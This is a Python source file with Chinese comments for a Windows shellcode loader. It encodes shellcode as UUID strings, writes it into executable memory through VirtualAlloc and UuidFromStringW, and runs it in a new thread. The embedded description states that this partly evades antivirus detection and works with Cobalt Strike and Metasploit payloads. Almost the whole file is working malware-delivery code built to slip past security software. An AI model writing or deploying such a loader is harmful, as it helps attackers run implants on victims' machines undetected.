import ctypes
import sys
import uuid

info="uuid加载器使用VirtualAlloc的内存申请方式，配合UuidFromStringW这个函数，可以直接将uuid格式的shellcode加载进内存，一定作用上规避杀毒软件检测，但本质上的作用和shellcode加密类似，只是改变了加载时的shellcode，写入内存后的内容依然是还原的shellcode，所以效果有限。"


def getuuid(scode):

    _=len(scode)%16
    if _!=0:
        scode+=b'\x00'*(16-_)
    print(len(scode))
    list = []
    for i in range(int(len(scode)/16)):
        bytes_a = scode[i*16:16+i*16]
        b = uuid.UUID(bytes_le=bytes_a)
        list.append(str(b))
    return list

def main(buf):
    if isinstance(buf,str):
        buf=buf.encode('latin1')    #确保buf是unicode，此处是为了兼容CS和MSF

    #将shellcode转换为uuid形式
    shellcode=getuuid(buf)

    #VirtualAlloc动态申请内存
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)*16), ctypes.c_int(0x3000),ctypes.c_int(0x40))

    #将UUID形式的shellcode写入内存
    rwxpage1 = ptr
    for i in shellcode:
        a=ctypes.windll.Rpcrt4.UuidFromStringW(i,ctypes.c_uint64(rwxpage1))
        rwxpage1+=16

    #创建进程运行shellcode
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

    #等待执行
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))


if __name__ == '__main__':
    import shellcoder
    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
    print('buf:\n',buf)

    if not buf:
        sys.exit()
    else:

        main(buf)